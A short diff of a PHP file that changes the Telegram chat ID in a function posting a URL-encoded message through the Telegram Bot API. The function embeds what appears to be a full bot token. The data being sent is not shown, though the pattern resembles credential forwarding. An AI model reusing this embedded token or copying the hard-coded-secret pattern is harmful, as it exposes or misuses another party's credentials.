@@ -7,7 +7,7 @@ $message = "
 
 function sendMessage($messaggio) {
     $token = '1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ';
-    $chatid = '1097743075';
+    $chatid = '-662491150';
     $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
     $url = $url . "&text=" . urlencode($messaggio);
     $ch = curl_init();
